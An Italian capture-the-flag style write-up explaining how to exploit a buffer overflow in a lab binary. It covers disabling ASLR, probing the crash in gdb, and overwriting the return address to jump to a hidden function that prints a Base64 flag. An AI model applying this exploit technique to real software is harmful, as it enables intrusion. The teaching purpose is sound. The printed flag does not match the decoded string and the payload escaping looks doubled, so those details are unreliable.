->BINARY EXPLOITS: Buffer Overflow e Recupero della Flag------------------------------
Questo esercizio si concentra sullo sfruttamento di una vulnerabilità di buffer overflow per recuperare una flag nascosta. Ecco una spiegazione dettagliata dei passaggi necessari per eseguire l'attacco.

-> 1. Preliminari------------------
Prima di iniziare, ci sono alcune operazioni preliminari da eseguire:

	1 Disabilitare la randomizzazione dello spazio degli indirizzi (si deve eseguire il seguente comando dai privilegi di root): echo 0 > /proc/sys/kernel/randomize_va_space
	 Questo comando disabilita la randomizzazione dello spazio degli indirizzi (ASLR), facilitando la previsione degli indirizzi di memoria.

	2 Assicurarsi che l'eseguibile sia eseguibile: chmod +x ./esame
		
-> 2. Analisi dell'Eseguibile con gdb-----------------

	1 Avviare gdb e impostare il formato dell'assembly su Intel: gdb esame
(gdb) set disassembly-flavor intel
	
	2 Eseguire un primo run con un input di prova: (gdb) run AAAA
	 Questo comando aiuta a capire se l'eseguibile accetta argomenti e come gestisce l'input.

-> 3. Sfruttare il Buffer Overflow-----------------

	1 Tentare un buffer overflow: (gdb) run $(perl -e "print 'A'x30")
		 Questo comando riempie il buffer con 30 caratteri 'A'. Se causa un segmentation fault, significa che il buffer overflow è possibile.

	2 Controllare il ritorno: (gdb) run $(perl -e "print 'A'x16,'BBBB'")
		 Inserendo 16 caratteri 'A' seguiti da 'BBBB', possiamo vedere se riusciamo a sovrascrivere l'indirizzo di ritorno della funzione.

-> 4. Disassemblare e Analizzare il Codice -------------------------

	1 Disassemblare la funzione main: (gdb) disas main
	
	2 Analizzare il codice per trovare funzioni nascoste: (gdb) info function
		 Questo comando elenca tutte le funzioni nell'eseguibile. Cerca funzioni NON chiamate dal main, che potrebbero contenere la flag.

-> 5. Saltare ad una Funzione Nascosta

	1 Trovare l'indirizzo della funzione nascosta e usarlo per sfruttare il buffer overflow. Ad esempio, se troviamo una funzione all'indirizzo 0x0804963d: Questo comando riempie il buffer con 16 caratteri 'A', seguiti dall'indirizzo della funzione nascosta in formato little-endian. (gdb) run $(perl -e 'print "A"x16,"\\\\x3d\\\\x96\\\\x04\\\\x08"')
	
-> 6. Decodificare la Flag

	1 Eseguire il comando e ottenere la flag: //SEC{c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbechig}

	2 Decodificare la stringa Base64: La stringa c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbg== è una codifica Base64. echo 'c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbg==' | base64 -d
		 Questo comando decodifica la stringa Base64, rivelando: simple buffer overflow with secret function


